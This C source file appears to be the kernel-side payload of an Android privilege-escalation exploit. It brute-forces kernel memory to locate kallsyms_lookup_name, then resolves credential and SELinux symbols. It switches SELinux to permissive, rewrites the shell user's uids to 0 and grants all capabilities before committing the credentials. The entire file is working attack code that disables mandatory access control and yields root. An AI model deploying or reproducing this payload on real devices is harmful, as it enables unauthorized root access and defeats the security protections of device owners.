#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#ifndef NDEBUG
#define DEBUG
#endif

static char *memmem(char *start, char *end, char *needle, unsigned int len, int adv) {
    char *p = (adv > 0) ? start : end-len;
    while (p >= start && p <= end-len) {
        for (unsigned int i = 0; i < len; i++) {
            if (p[i] != needle[i])
                goto next;
        }
        return p;

next:
        p += adv;
    }

    return NULL;
}

static int strlen(char *str) {
    int i = 0;
    while (*str++)
        i++;
    return i;
}

#define KERNEL_BASE   0xc0008000
#define KERNEL_LENGTH 0x01000000 // 16MiB

static void *brute_lookup(char *name) {
    int len = strlen(name)+1;

    char *start = (char *)KERNEL_BASE;
    char *end = (char *)(KERNEL_BASE+KERNEL_LENGTH);

    char *strp = memmem(start, end, name, len, 1);
    if (!strp)
        return NULL;

    void *pp = memmem(start, strp, (char*)&strp, sizeof(char*), -1);
    if (!pp)
        return NULL;

    void **fp = pp-sizeof(char*);
    return *fp;
}

#define ERR(msg, args...) do { printk("Error: " msg "\n", ##args); return 1; } while(0)

#define getsym(name) ({ \
    void *p = kallsyms_lookup_name(name); \
    if (!p) \
        ERR("Symbol %s not found!", name); \
    p; \
})

#ifdef DEBUG
typedef enum {
    DUMP_PREFIX_NONE,
    DUMP_PREFIX_ADDRESS,
    DUMP_PREFIX_OFFSET
} dump_prefix_type_t;
#endif

struct cap {
    uint32_t caps[2];
};

struct cred {
    uint32_t usage;
    uint32_t uids[8];
    uint32_t securebits;
    struct cap caps[4];
    void *security, *user, *user_ns, *group_info;
    uint32_t rcu_head;
};

#define ELEMS(x) (sizeof(x)/sizeof((x)[0]))
#define SHELL_UID 2000

#define UNUSED __attribute__((unused))

int start(int argc UNUSED, char **argv UNUSED) {
    void *(*kallsyms_lookup_name)(char *) = brute_lookup("kallsyms_lookup_name");
    if (!kallsyms_lookup_name)
        return 3;

    void (*printk)(char *, ...) = kallsyms_lookup_name("printk");
    if (!printk)
        return 2;

    void *(*prepare_creds)() = getsym("prepare_creds");
    int (*commit_creds)(void *) = getsym("commit_creds");
    int *selinux_enforcing = getsym("selinux_enforcing");
    void (*selinux_status_update_setenforce)(uint32_t) = getsym("selinux_status_update_setenforce");

    *selinux_enforcing = 0;
    selinux_status_update_setenforce(*selinux_enforcing);
    printk("SELinux set to Permissive.\n");

    struct cred *c = prepare_creds();
    if (!c)
        ERR("prepare_creds failed");

#ifdef DEBUG
    printk("prepare_creds = %p\n", c);
    void *(*print_hex_dump)(const char *level, const char *prefix_str, dump_prefix_type_t prefix_type,
                int rowsize, int groupsize, const void *buf, size_t len, bool ascii)
            = getsym("print_hex_dump");
    print_hex_dump("", "", DUMP_PREFIX_ADDRESS, 16, 4, c, sizeof(struct cred), true);
#endif

    for (unsigned int i = 0; i < ELEMS(c->uids); i++) {
        if (c->uids[i] != SHELL_UID)
            ERR("uids[%d] == %d, expected %d", i, c->uids[i], SHELL_UID);
        c->uids[i] = 0;
    }

    for (unsigned int i = 0; i < ELEMS(c->caps); i++) {
        c->caps[i].caps[0] = c->caps[i].caps[1] = ~0;
    }

#ifdef DEBUG
    printk("new creds:\n");
    print_hex_dump("", "", DUMP_PREFIX_ADDRESS, 16, 4, c, sizeof(struct cred), true);
#endif

    if (commit_creds(c))
        ERR("commit_creds failed");

    printk("Credentials committed, have fun.\n\n");

    return 0;
}
